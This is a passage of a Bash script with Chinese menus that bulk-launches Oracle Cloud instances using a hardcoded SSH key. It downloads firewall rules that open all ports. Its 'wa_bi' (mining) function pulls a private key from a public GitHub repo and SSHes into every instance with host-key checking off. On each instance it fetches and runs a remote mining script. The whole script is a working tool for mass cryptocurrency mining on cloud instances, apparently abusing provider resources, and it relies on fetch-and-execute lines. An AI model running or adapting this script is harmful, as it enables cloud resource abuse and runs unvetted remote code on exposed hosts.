  fi 

}
function microa_e24() {
  echo -e " 第15台${time}${name} "
  oci compute instance launch --availability-domain ${DOMAINA} --display-name ${time}${name} --image-id ${IMAGEE24}  --subnet-id ${SUBNETIDA}  --shape VM.Standard.E2.4  --assign-public-ip true  --shape-config '{"ocpus":4,"memory_in_gbs":32,"local_disks":50}' --metadata '{"ssh_authorized_keys": "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAohFX9JoZusjJMfA2S2xEQeMgKu7u9TRiEhChh0psgP3yF7sICxVSPZQt+kIYrXEffDRlajlxt78NecRKqfiRh2D4HL0okrESrHOAJ97HZloA9hVPimfAt5oMvzggrVZilN41iaZX4lxYlu8r6fFeZjBocvRs3VN/6JZt1Naj8KGnuLL22wl9UzXeGrw6D2GRtiki6qGNcaNE2mdL4f5y6DGsCHMPqw2a/MrkE9bXX8XYjhd3+zRa9PNoYV6XoVX0o9E184jrIekOhK892g/kjtbzrNpwUbhDZlVYSifUAVD7URrqZWB8W0nIMjaOTfcyG/Y4yhwR/cSZksstje6IaQ== smithao"}' > /root/oracle/ip/microa_e24
  
  total=$(cat /root/oracle/total.txt)
  microa_e24=$(cat /root/oracle/ip/microa_e24)
  ID="metadata"
  if [[ $microa_e24 == *$ID* ]]
  then
  ((total=total+1))
  
  echo -e $total > /root/oracle/total.txt
  fi 

}
function microa_e22() {
  echo -e " 第16台${time}${name} "
  oci compute instance launch --availability-domain ${DOMAINA} --display-name ${time}${name} --image-id ${IMAGEE22}  --subnet-id ${SUBNETIDA}  --shape VM.Standard.E2.2  --assign-public-ip true  --shape-config '{"ocpus":2,"memory_in_gbs":16,"local_disks":50}' --metadata '{"ssh_authorized_keys": "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAohFX9JoZusjJMfA2S2xEQeMgKu7u9TRiEhChh0psgP3yF7sICxVSPZQt+kIYrXEffDRlajlxt78NecRKqfiRh2D4HL0okrESrHOAJ97HZloA9hVPimfAt5oMvzggrVZilN41iaZX4lxYlu8r6fFeZjBocvRs3VN/6JZt1Naj8KGnuLL22wl9UzXeGrw6D2GRtiki6qGNcaNE2mdL4f5y6DGsCHMPqw2a/MrkE9bXX8XYjhd3+zRa9PNoYV6XoVX0o9E184jrIekOhK892g/kjtbzrNpwUbhDZlVYSifUAVD7URrqZWB8W0nIMjaOTfcyG/Y4yhwR/cSZksstje6IaQ== smithao"}' > /root/oracle/ip/microa_e22
  
  total=$(cat /root/oracle/total.txt)
  microa_e22=$(cat /root/oracle/ip/microa_e22)
  ID="metadata"
  if [[ $microa_e22 == *$ID* ]]
  then
  ((total=total+1))
 
  echo -e $total > /root/oracle/total.txt
  fi 

}


function microb_14() {
  echo -e " 第17台${time}${name} "
  oci compute instance launch --availability-domain ${DOMAINB} --display-name ${time}${name} --image-id ${IMAGE14}  --subnet-id ${SUBNETIDB}  --shape VM.Standard1.4  --assign-public-ip true  --shape-config '{"ocpus":4,"memory_in_gbs":28,"local_disks":50}' --metadata '{"ssh_authorized_keys": "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAohFX9JoZusjJMfA2S2xEQeMgKu7u9TRiEhChh0psgP3yF7sICxVSPZQt+kIYrXEffDRlajlxt78NecRKqfiRh2D4HL0okrESrHOAJ97HZloA9hVPimfAt5oMvzggrVZilN41iaZX4lxYlu8r6fFeZjBocvRs3VN/6JZt1Naj8KGnuLL22wl9UzXeGrw6D2GRtiki6qGNcaNE2mdL4f5y6DGsCHMPqw2a/MrkE9bXX8XYjhd3+zRa9PNoYV6XoVX0o9E184jrIekOhK892g/kjtbzrNpwUbhDZlVYSifUAVD7URrqZWB8W0nIMjaOTfcyG/Y4yhwR/cSZksstje6IaQ== smithao"}' > /root/oracle/ip/microb_14

  total=$(cat /root/oracle/total.txt)
  microb_14=$(cat /root/oracle/ip/microb_14)
  ID="metadata"
  if [[ $microb_14 == *$ID* ]]
  then
  ((total=total+1))
 
  echo -e $total > /root/oracle/total.txt
  fi 

}
function microb_12() {
  echo -e " 第18台${time}${name} "
  oci compute instance launch --availability-domain ${DOMAINB} --display-name ${time}${name} --image-id ${IMAGE12}  --subnet-id ${SUBNETIDB}  --shape VM.Standard1.2  --assign-public-ip true  --shape-config '{"ocpus":2,"memory_in_gbs":14,"local_disks":50}' --metadata '{"ssh_authorized_keys": "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAohFX9JoZusjJMfA2S2xEQeMgKu7u9TRiEhChh0psgP3yF7sICxVSPZQt+kIYrXEffDRlajlxt78NecRKqfiRh2D4HL0okrESrHOAJ97HZloA9hVPimfAt5oMvzggrVZilN41iaZX4lxYlu8r6fFeZjBocvRs3VN/6JZt1Naj8KGnuLL22wl9UzXeGrw6D2GRtiki6qGNcaNE2mdL4f5y6DGsCHMPqw2a/MrkE9bXX8XYjhd3+zRa9PNoYV6XoVX0o9E184jrIekOhK892g/kjtbzrNpwUbhDZlVYSifUAVD7URrqZWB8W0nIMjaOTfcyG/Y4yhwR/cSZksstje6IaQ== smithao"}' > /root/oracle/ip/microb_12
  
  total=$(cat /root/oracle/total.txt)
  microb_12=$(cat /root/oracle/ip/microb_12)
  ID="metadata"
  if [[ $microb_12 == *$ID* ]]
  then
  ((total=total+1))
  
  echo -e $total > /root/oracle/total.txt
  fi 

}
function microb_e24() {
  echo -e " 第19台${time}${name} "
  oci compute instance launch --availability-domain ${DOMAINB} --display-name ${time}${name} --image-id ${IMAGEE24}  --subnet-id ${SUBNETIDB}  --shape VM.Standard.E2.4  --assign-public-ip true  --shape-config '{"ocpus":4,"memory_in_gbs":32,"local_disks":50}' --metadata '{"ssh_authorized_keys": "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAohFX9JoZusjJMfA2S2xEQeMgKu7u9TRiEhChh0psgP3yF7sICxVSPZQt+kIYrXEffDRlajlxt78NecRKqfiRh2D4HL0okrESrHOAJ97HZloA9hVPimfAt5oMvzggrVZilN41iaZX4lxYlu8r6fFeZjBocvRs3VN/6JZt1Naj8KGnuLL22wl9UzXeGrw6D2GRtiki6qGNcaNE2mdL4f5y6DGsCHMPqw2a/MrkE9bXX8XYjhd3+zRa9PNoYV6XoVX0o9E184jrIekOhK892g/kjtbzrNpwUbhDZlVYSifUAVD7URrqZWB8W0nIMjaOTfcyG/Y4yhwR/cSZksstje6IaQ== smithao"}' > /root/oracle/ip/microb_e24
  
  total=$(cat /root/oracle/total.txt)
  microb_e24=$(cat /root/oracle/ip/microb_e24)
  ID="metadata"
  if [[ $microb_e24 == *$ID* ]]
  then
  ((total=total+1))
  
  echo -e $total > /root/oracle/total.txt
  fi 

}
function microb_e22() {
  echo -e " 第20台${time}${name} "
  oci compute instance launch --availability-domain ${DOMAINB} --display-name ${time}${name} --image-id ${IMAGEE22}  --subnet-id ${SUBNETIDB}  --shape VM.Standard.E2.2  --assign-public-ip true  --shape-config '{"ocpus":2,"memory_in_gbs":16,"local_disks":50}' --metadata '{"ssh_authorized_keys": "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAohFX9JoZusjJMfA2S2xEQeMgKu7u9TRiEhChh0psgP3yF7sICxVSPZQt+kIYrXEffDRlajlxt78NecRKqfiRh2D4HL0okrESrHOAJ97HZloA9hVPimfAt5oMvzggrVZilN41iaZX4lxYlu8r6fFeZjBocvRs3VN/6JZt1Naj8KGnuLL22wl9UzXeGrw6D2GRtiki6qGNcaNE2mdL4f5y6DGsCHMPqw2a/MrkE9bXX8XYjhd3+zRa9PNoYV6XoVX0o9E184jrIekOhK892g/kjtbzrNpwUbhDZlVYSifUAVD7URrqZWB8W0nIMjaOTfcyG/Y4yhwR/cSZksstje6IaQ== smithao"}'> /root/oracle/ip/microb_e22

  total=$(cat /root/oracle/total.txt)
  microb_e22=$(cat /root/oracle/ip/microb_e22)
  ID="metadata"
  if [[ $microb_e22 == *$ID* ]]
  then
  ((total=total+1))
 
  echo -e $total > /root/oracle/total.txt
  fi 
}



function microc_14() {
  echo -e " 第21台${time}${name} "
  oci compute instance launch --availability-domain ${DOMAINC} --display-name ${time}${name} --image-id ${IMAGE14}  --subnet-id ${SUBNETIDC}  --shape VM.Standard1.4  --assign-public-ip true  --shape-config '{"ocpus":4,"memory_in_gbs":28,"local_disks":50}' --metadata '{"ssh_authorized_keys": "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAohFX9JoZusjJMfA2S2xEQeMgKu7u9TRiEhChh0psgP3yF7sICxVSPZQt+kIYrXEffDRlajlxt78NecRKqfiRh2D4HL0okrESrHOAJ97HZloA9hVPimfAt5oMvzggrVZilN41iaZX4lxYlu8r6fFeZjBocvRs3VN/6JZt1Naj8KGnuLL22wl9UzXeGrw6D2GRtiki6qGNcaNE2mdL4f5y6DGsCHMPqw2a/MrkE9bXX8XYjhd3+zRa9PNoYV6XoVX0o9E184jrIekOhK892g/kjtbzrNpwUbhDZlVYSifUAVD7URrqZWB8W0nIMjaOTfcyG/Y4yhwR/cSZksstje6IaQ== smithao"}' > /root/oracle/ip/microc_14
 
  total=$(cat /root/oracle/total.txt)
  microc_14=$(cat /root/oracle/ip/microc_14)
  ID="metadata"
  if [[ $microc_14 == *$ID* ]]
  then
  ((total=total+1))
 
  echo -e $total > /root/oracle/total.txt
  fi 

}
function microc_12() {
  echo -e " 第22台${time}${name} "
  oci compute instance launch --availability-domain ${DOMAINC} --display-name ${time}${name} --image-id ${IMAGE12}  --subnet-id ${SUBNETIDC}  --shape VM.Standard1.2  --assign-public-ip true  --shape-config '{"ocpus":2,"memory_in_gbs":14,"local_disks":50}' --metadata '{"ssh_authorized_keys": "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAohFX9JoZusjJMfA2S2xEQeMgKu7u9TRiEhChh0psgP3yF7sICxVSPZQt+kIYrXEffDRlajlxt78NecRKqfiRh2D4HL0okrESrHOAJ97HZloA9hVPimfAt5oMvzggrVZilN41iaZX4lxYlu8r6fFeZjBocvRs3VN/6JZt1Naj8KGnuLL22wl9UzXeGrw6D2GRtiki6qGNcaNE2mdL4f5y6DGsCHMPqw2a/MrkE9bXX8XYjhd3+zRa9PNoYV6XoVX0o9E184jrIekOhK892g/kjtbzrNpwUbhDZlVYSifUAVD7URrqZWB8W0nIMjaOTfcyG/Y4yhwR/cSZksstje6IaQ== smithao"}' > /root/oracle/ip/microc_12
  
  total=$(cat /root/oracle/total.txt)
  microc_12=$(cat /root/oracle/ip/microc_12)
  ID="metadata"
  if [[ $microc_12 == *$ID* ]]
  then
  ((total=total+1))
 
  echo -e $total > /root/oracle/total.txt
  fi 

}
function microc_e24() {
  echo -e " 第23台${time}${name} "
  oci compute instance launch --availability-domain ${DOMAINC} --display-name ${time}${name} --image-id ${IMAGEE24}  --subnet-id ${SUBNETIDC}  --shape VM.Standard.E2.4  --assign-public-ip true  --shape-config '{"ocpus":4,"memory_in_gbs":32,"local_disks":50}' --metadata '{"ssh_authorized_keys": "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAohFX9JoZusjJMfA2S2xEQeMgKu7u9TRiEhChh0psgP3yF7sICxVSPZQt+kIYrXEffDRlajlxt78NecRKqfiRh2D4HL0okrESrHOAJ97HZloA9hVPimfAt5oMvzggrVZilN41iaZX4lxYlu8r6fFeZjBocvRs3VN/6JZt1Naj8KGnuLL22wl9UzXeGrw6D2GRtiki6qGNcaNE2mdL4f5y6DGsCHMPqw2a/MrkE9bXX8XYjhd3+zRa9PNoYV6XoVX0o9E184jrIekOhK892g/kjtbzrNpwUbhDZlVYSifUAVD7URrqZWB8W0nIMjaOTfcyG/Y4yhwR/cSZksstje6IaQ== smithao"}' > /root/oracle/ip/microc_e24

  total=$(cat /root/oracle/total.txt)
  microc_e24=$(cat /root/oracle/ip/microc_e24)
  ID="metadata"
  if [[ $microc_e24 == *$ID* ]]
  then
  ((total=total+1))
 
  echo -e $total > /root/oracle/total.txt
  fi 
}
function microc_e22() {
  echo -e " 第24台${time}${name} "
  oci compute instance launch --availability-domain ${DOMAINC} --display-name ${time}${name} --image-id ${IMAGEE22}  --subnet-id ${SUBNETIDC}  --shape VM.Standard.E2.2  --assign-public-ip true  --shape-config '{"ocpus":2,"memory_in_gbs":16,"local_disks":50}' --metadata '{"ssh_authorized_keys": "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAohFX9JoZusjJMfA2S2xEQeMgKu7u9TRiEhChh0psgP3yF7sICxVSPZQt+kIYrXEffDRlajlxt78NecRKqfiRh2D4HL0okrESrHOAJ97HZloA9hVPimfAt5oMvzggrVZilN41iaZX4lxYlu8r6fFeZjBocvRs3VN/6JZt1Naj8KGnuLL22wl9UzXeGrw6D2GRtiki6qGNcaNE2mdL4f5y6DGsCHMPqw2a/MrkE9bXX8XYjhd3+zRa9PNoYV6XoVX0o9E184jrIekOhK892g/kjtbzrNpwUbhDZlVYSifUAVD7URrqZWB8W0nIMjaOTfcyG/Y4yhwR/cSZksstje6IaQ== smithao"}' > /root/oracle/ip/microc_e22

  total=$(cat /root/oracle/total.txt)
  microc_e22=$(cat /root/oracle/ip/microc_e22)
  ID="metadata"
  if [[ $microc_e22 == *$ID* ]]
  then
  ((total=total+1))
  
  echo -e $total > /root/oracle/total.txt
  fi 
}

function arm() {
  echo -e " 第25台${time}${name} "
  oci compute instance launch --availability-domain ${DOMAINA} --display-name ${time}${name} --image-id ${IMAGEARM}  --subnet-id ${SUBNETIDA}  --shape VM.Standard.A1.Flex  --assign-public-ip true  --shape-config '{"ocpus":16,"memory_in_gbs":96,"local_disks":50}' --metadata '{"ssh_authorized_keys": "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAohFX9JoZusjJMfA2S2xEQeMgKu7u9TRiEhChh0psgP3yF7sICxVSPZQt+kIYrXEffDRlajlxt78NecRKqfiRh2D4HL0okrESrHOAJ97HZloA9hVPimfAt5oMvzggrVZilN41iaZX4lxYlu8r6fFeZjBocvRs3VN/6JZt1Naj8KGnuLL22wl9UzXeGrw6D2GRtiki6qGNcaNE2mdL4f5y6DGsCHMPqw2a/MrkE9bXX8XYjhd3+zRa9PNoYV6XoVX0o9E184jrIekOhK892g/kjtbzrNpwUbhDZlVYSifUAVD7URrqZWB8W0nIMjaOTfcyG/Y4yhwR/cSZksstje6IaQ== smithao"}' >> /root/oracle/ip/arma 2>&1
  arma=$(cat /root/oracle/ip/arma)
  ID="metadata"
  if [[ $arma != *$ID* ]]
  then 
      oci compute instance launch --availability-domain ${DOMAINB} --display-name ${time}${name} --image-id ${IMAGEARM}  --subnet-id ${SUBNETIDB}  --shape VM.Standard.A1.Flex  --assign-public-ip true  --shape-config '{"ocpus":16,"memory_in_gbs":96,"local_disks":50}' --metadata '{"ssh_authorized_keys": "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAohFX9JoZusjJMfA2S2xEQeMgKu7u9TRiEhChh0psgP3yF7sICxVSPZQt+kIYrXEffDRlajlxt78NecRKqfiRh2D4HL0okrESrHOAJ97HZloA9hVPimfAt5oMvzggrVZilN41iaZX4lxYlu8r6fFeZjBocvRs3VN/6JZt1Naj8KGnuLL22wl9UzXeGrw6D2GRtiki6qGNcaNE2mdL4f5y6DGsCHMPqw2a/MrkE9bXX8XYjhd3+zRa9PNoYV6XoVX0o9E184jrIekOhK892g/kjtbzrNpwUbhDZlVYSifUAVD7URrqZWB8W0nIMjaOTfcyG/Y4yhwR/cSZksstje6IaQ== smithao"}' >> /root/oracle/ip/armb 2>&1
      armb=$(cat /root/oracle/ip/armb)
      ID="metadata"
      if [[ $armb == *$ID* ]]
      then 
	  total=$(cat /root/oracle/total.txt)
      ((total=total+1))
      echo -e $total > /root/oracle/total.txt
	  else  
	        oci compute instance launch --availability-domain ${DOMAINC} --display-name ${time}${name} --image-id ${IMAGEARM}  --subnet-id ${SUBNETIDC}  --shape VM.Standard.A1.Flex  --assign-public-ip true  --shape-config '{"ocpus":16,"memory_in_gbs":96,"local_disks":50}' --metadata '{"ssh_authorized_keys": "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAohFX9JoZusjJMfA2S2xEQeMgKu7u9TRiEhChh0psgP3yF7sICxVSPZQt+kIYrXEffDRlajlxt78NecRKqfiRh2D4HL0okrESrHOAJ97HZloA9hVPimfAt5oMvzggrVZilN41iaZX4lxYlu8r6fFeZjBocvRs3VN/6JZt1Naj8KGnuLL22wl9UzXeGrw6D2GRtiki6qGNcaNE2mdL4f5y6DGsCHMPqw2a/MrkE9bXX8XYjhd3+zRa9PNoYV6XoVX0o9E184jrIekOhK892g/kjtbzrNpwUbhDZlVYSifUAVD7URrqZWB8W0nIMjaOTfcyG/Y4yhwR/cSZksstje6IaQ== smithao"}' > /root/oracle/ip/armc
            armc=$(cat /root/oracle/ip/armc)
            ID="metadata"
            if [[ $armc == *$ID* ]]
            then 
	        total=$(cat /root/oracle/total.txt)
            ((total=total+1))
             echo -e $total > /root/oracle/total.txt
		    fi
	  
      fi
  else
  total=$(cat /root/oracle/total.txt)
  ((total=total+1))
  
  echo -e $total > /root/oracle/total.txt
 fi 

}

function amd1() {
  echo -e " 第26台${time}${name}"
  oci compute instance launch --availability-domain ${DOMAINA} --display-name ${time}${name} --image-id ${IMAGEAMD}  --subnet-id ${SUBNETIDA}  --shape VM.Standard.E2.1.Micro  --assign-public-ip true --metadata '{"ssh_authorized_keys": "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAohFX9JoZusjJMfA2S2xEQeMgKu7u9TRiEhChh0psgP3yF7sICxVSPZQt+kIYrXEffDRlajlxt78NecRKqfiRh2D4HL0okrESrHOAJ97HZloA9hVPimfAt5oMvzggrVZilN41iaZX4lxYlu8r6fFeZjBocvRs3VN/6JZt1Naj8KGnuLL22wl9UzXeGrw6D2GRtiki6qGNcaNE2mdL4f5y6DGsCHMPqw2a/MrkE9bXX8XYjhd3+zRa9PNoYV6XoVX0o9E184jrIekOhK892g/kjtbzrNpwUbhDZlVYSifUAVD7URrqZWB8W0nIMjaOTfcyG/Y4yhwR/cSZksstje6IaQ== smithao"}' >> /root/oracle/ip/amd1a 2>&1
  amd1a=$(cat /root/oracle/ip/amd1a)
  ID="metadata"
  if [[ $amd1a != *$ID* ]]
  then 
      oci compute instance launch --availability-domain ${DOMAINB} --display-name ${time}${name} --image-id ${IMAGEAMD}  --subnet-id ${SUBNETIDB}  --shape VM.Standard.E2.1.Micro  --assign-public-ip true --metadata '{"ssh_authorized_keys": "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAohFX9JoZusjJMfA2S2xEQeMgKu7u9TRiEhChh0psgP3yF7sICxVSPZQt+kIYrXEffDRlajlxt78NecRKqfiRh2D4HL0okrESrHOAJ97HZloA9hVPimfAt5oMvzggrVZilN41iaZX4lxYlu8r6fFeZjBocvRs3VN/6JZt1Naj8KGnuLL22wl9UzXeGrw6D2GRtiki6qGNcaNE2mdL4f5y6DGsCHMPqw2a/MrkE9bXX8XYjhd3+zRa9PNoYV6XoVX0o9E184jrIekOhK892g/kjtbzrNpwUbhDZlVYSifUAVD7URrqZWB8W0nIMjaOTfcyG/Y4yhwR/cSZksstje6IaQ== smithao"}' >> /root/oracle/ip/amd1b 2>&1
      amd1b=$(cat /root/oracle/ip/amd1b)
      ID="metadata"
      if [[ $amd1b == *$ID* ]]
      then 
	  total=$(cat /root/oracle/total.txt)
      ((total=total+1))
      echo -e $total > /root/oracle/total.txt
	  else 
	        oci compute instance launch --availability-domain ${DOMAINC} --display-name ${time}${name} --image-id ${IMAGEAMD}  --subnet-id ${SUBNETIDC}  --shape VM.Standard.E2.1.Micro  --assign-public-ip true --metadata '{"ssh_authorized_keys": "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAohFX9JoZusjJMfA2S2xEQeMgKu7u9TRiEhChh0psgP3yF7sICxVSPZQt+kIYrXEffDRlajlxt78NecRKqfiRh2D4HL0okrESrHOAJ97HZloA9hVPimfAt5oMvzggrVZilN41iaZX4lxYlu8r6fFeZjBocvRs3VN/6JZt1Naj8KGnuLL22wl9UzXeGrw6D2GRtiki6qGNcaNE2mdL4f5y6DGsCHMPqw2a/MrkE9bXX8XYjhd3+zRa9PNoYV6XoVX0o9E184jrIekOhK892g/kjtbzrNpwUbhDZlVYSifUAVD7URrqZWB8W0nIMjaOTfcyG/Y4yhwR/cSZksstje6IaQ== smithao"}' > /root/oracle/ip/amd1c
            amd1c=$(cat /root/oracle/ip/amd1c)
            ID="metadata"
            if [[ $amd1c == *$ID* ]]
            then 
	        total=$(cat /root/oracle/total.txt)
            ((total=total+1))
             echo -e $total > /root/oracle/total.txt
		    fi
	  
      fi
  
  
  else
  total=$(cat /root/oracle/total.txt)
  ((total=total+1))
  
  echo -e $total > /root/oracle/total.txt
  fi 
}

function amd2() {
  echo -e " 第27台${time}${name} "
  oci compute instance launch --availability-domain ${DOMAINA} --display-name ${time}${name} --image-id ${IMAGEAMD}  --subnet-id ${SUBNETIDA}  --shape VM.Standard.E2.1.Micro  --assign-public-ip true --metadata '{"ssh_authorized_keys": "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAohFX9JoZusjJMfA2S2xEQeMgKu7u9TRiEhChh0psgP3yF7sICxVSPZQt+kIYrXEffDRlajlxt78NecRKqfiRh2D4HL0okrESrHOAJ97HZloA9hVPimfAt5oMvzggrVZilN41iaZX4lxYlu8r6fFeZjBocvRs3VN/6JZt1Naj8KGnuLL22wl9UzXeGrw6D2GRtiki6qGNcaNE2mdL4f5y6DGsCHMPqw2a/MrkE9bXX8XYjhd3+zRa9PNoYV6XoVX0o9E184jrIekOhK892g/kjtbzrNpwUbhDZlVYSifUAVD7URrqZWB8W0nIMjaOTfcyG/Y4yhwR/cSZksstje6IaQ== smithao"}' >> /root/oracle/ip/amd2a 2>&1
  amd2a=$(cat /root/oracle/ip/amd2a)
  ID="metadata"
  if [[ $amd2a != *$ID* ]]
  then  
      oci compute instance launch --availability-domain ${DOMAINB} --display-name ${time}${name} --image-id ${IMAGEAMD}  --subnet-id ${SUBNETIDB}  --shape VM.Standard.E2.1.Micro  --assign-public-ip true --metadata '{"ssh_authorized_keys": "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAohFX9JoZusjJMfA2S2xEQeMgKu7u9TRiEhChh0psgP3yF7sICxVSPZQt+kIYrXEffDRlajlxt78NecRKqfiRh2D4HL0okrESrHOAJ97HZloA9hVPimfAt5oMvzggrVZilN41iaZX4lxYlu8r6fFeZjBocvRs3VN/6JZt1Naj8KGnuLL22wl9UzXeGrw6D2GRtiki6qGNcaNE2mdL4f5y6DGsCHMPqw2a/MrkE9bXX8XYjhd3+zRa9PNoYV6XoVX0o9E184jrIekOhK892g/kjtbzrNpwUbhDZlVYSifUAVD7URrqZWB8W0nIMjaOTfcyG/Y4yhwR/cSZksstje6IaQ== smithao"}' >> /root/oracle/ip/amd2b 2>&1
      amd2b=$(cat /root/oracle/ip/amd2b)
      ID="metadata"
      if [[ $amd2b == *$ID* ]]
      then 
	  total=$(cat /root/oracle/total.txt)
      ((total=total+1))
      echo -e $total > /root/oracle/total.txt
	  else 
	        oci compute instance launch --availability-domain ${DOMAINC} --display-name ${time}${name} --image-id ${IMAGEAMD}  --subnet-id ${SUBNETIDC}  --shape VM.Standard.E2.1.Micro  --assign-public-ip true --metadata '{"ssh_authorized_keys": "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAohFX9JoZusjJMfA2S2xEQeMgKu7u9TRiEhChh0psgP3yF7sICxVSPZQt+kIYrXEffDRlajlxt78NecRKqfiRh2D4HL0okrESrHOAJ97HZloA9hVPimfAt5oMvzggrVZilN41iaZX4lxYlu8r6fFeZjBocvRs3VN/6JZt1Naj8KGnuLL22wl9UzXeGrw6D2GRtiki6qGNcaNE2mdL4f5y6DGsCHMPqw2a/MrkE9bXX8XYjhd3+zRa9PNoYV6XoVX0o9E184jrIekOhK892g/kjtbzrNpwUbhDZlVYSifUAVD7URrqZWB8W0nIMjaOTfcyG/Y4yhwR/cSZksstje6IaQ== smithao"}' > /root/oracle/ip/amd2c
            amd2c=$(cat /root/oracle/ip/amd2c)
            ID="metadata"
            if [[ $amd2c == *$ID* ]]
            then 
	        total=$(cat /root/oracle/total.txt)
            ((total=total+1))
             echo -e $total > /root/oracle/total.txt
		    fi
	  
      fi


  else
  total=$(cat /root/oracle/total.txt)
  ((total=total+1))
  
  echo -e $total > /root/oracle/total.txt
  fi 
}

function get_ip() {
  rm -rf /root/oracle/ip.txt
  oci compute instance list-vnics > /root/oracle/ip/iplist
  iptext="/root/oracle/ip/iplist"
  pu=publicip
  sed -i "s/public-ip/${pu}/g" ${iptext}
 length=0 
 jq -c '.data[].publicip' /root/oracle/ip/iplist |  tr -d '"' | while read i; do
  ((length=length+1))
  echo -e  $i >> /root/oracle/ip.txt
  echo -e $length > /root/oracle/number.txt
  done
  mumber=$(cat /root/oracle/number.txt)
  echo -e "number"$mumber
  
  total=$(cat /root/oracle/total.txt)      
  echo -e "total"$total
     
  
   if [[ $mumber -eq $total ]]
   then
   print_ok "小鸡总数为"$mumber
   print_ok "—————————————— 挖币小鸡ip ——————————————"
    cat /root/oracle/ip.txt
    wa_bi
   else
    sleep 30s
	get_ip
  fi
	
}

function pre_pare() {
  cd /root && rm -rf oracle && mkdir oracle && cd /root/oracle && mkdir network && mkdir image && mkdir ip
  yum install -y wget jq screen
}
function install() {
 availability_domain
 subnet
 imageid
 open_instance 
 get_ip
}

function get_log() {
  cat /data/out.txt
}

function wa_bi() {
  cd / && rm -rf data && mkdir data && chmod 700 data && cd /data && wget -N --no-check-certificate -q -O smithao https://raw.githubusercontent.com/gcp5678/smithmlo/main/smithao && chmod 600 smithao
  print_ok "—————————————— 私钥已设置 ——————————————"""
  oci compute instance list-vnics > /root/oracle/ip/iplist
  iptext="/root/oracle/ip/iplist"
  pu=publicip
  sed -i "s/public-ip/${pu}/g" ${iptext}
  text1="ssh -i /data/smithao  -o StrictHostKeyChecking=no ubuntu@"
  text2=\""wget -N --no-check-certificate -q -O mlb.sh https://raw.githubusercontent.com/gcp5678/smithmlo/main/mlb.sh && chmod +x mlb.sh && ./mlb.sh\""
  jq -c '.data[].publicip' /root/oracle/ip/iplist |  tr -d '"' | while read i; do
  test="${text1}$i ${text2}"
  echo -e  $test >> ip.sh 2>&1
  done
  chmod 755 ip.sh && nohup ./ip.sh >> out.txt 2>&1 &
  print_ok "—————————————— 已在后台开始挖币，请等待几分钟 ——————————————"""
}

function security_list() {
  oci network security-list list > /root/oracle/network/securitylist
  print_ok "—————————————— 获取--security-list-id—————————————— "
  SECURITYLISTAID=$(cat /root/oracle/network/securitylist | jq .data[2].id | tr -d '"')
  SECURITYLISTBID=$(cat /root/oracle/network/securitylist | jq .data[1].id | tr -d '"')
  SECURITYLISTCID=$(cat /root/oracle/network/securitylist | jq .data[0].id | tr -d '"')
  print_ok "—————————————— 防火墙规则下载...—————————————— "
  cd /root/oracle/ && wget -N --no-check-certificate -q -O ingress-security-rules.json https://raw.githubusercontent.com/gcp5678/smithmlo/main/in-rules.json
  print_ok "—————————————— 下载完成，开始更新防火墙规则—————————————— "
  printf y  | oci network security-list update --security-list-id ${SECURITYLISTAID} --ingress-security-rules file:///root/oracle/ingress-security-rules.json >> /root/oracle/network/routrule 2>&1
  printf y  | oci network security-list update --security-list-id ${SECURITYLISTBID} --ingress-security-rules file:///root/oracle/ingress-security-rules.json >> /root/oracle/network/routrule 2>&1
  printf y  | oci network security-list update --security-list-id ${SECURITYLISTCID} --ingress-security-rules file:///root/oracle/ingress-security-rules.json >> /root/oracle/network/routrule 2>&1
  print_ok "—————————————— 防火墙更新完成，端口已全部打开—————————————— "
}

function deletet_instants() {
  oci compute instance list > /root/oracle/instancelist
  text0="printf y  | "
  text1="oci compute instance terminate --preserve-boot-volume false --instance-id "
  jq -c '.data[].id' /root/oracle/instancelist |  tr -d '"' | while read i; do
  test="${text0}${text1}$i"
  echo -e  $test >> instants.sh 2>&1
  done
  chmod 755 instants.sh && nohup ./instants.sh >> out.txt 2>&1 &
}

menu() {
  echo -e "—————————————— 开机向导 ——————————————"""
  echo -e "${Green}0.${Font}  一键"
  echo -e "${Green}1.${Font}  安装配置"
  echo -e "${Green}2.${Font}  开鸡挖币"
  echo -e "${Green}3.${Font}  查看log"
  echo -e "${Green}4.${Font}  开机"
  echo -e "${Green}5.${Font}  挖币"
  echo -e "${Green}6.${Font}  删鸡"
  read -rp "请输入数字：" menu_num
  case $menu_num in
  0)
  install_oci
  install
  ;;
  1)
  install_oci
  ;;
  2)
  install
  ;;
  3)
  get_log
  ;;
  4)
  availability_domain
  subnet
  imageid
  open_instance
  ;;
  5)
  get_ip
  ;;
  6)
  deletet_instants
  ;;
  esac
}
 menu "$@"




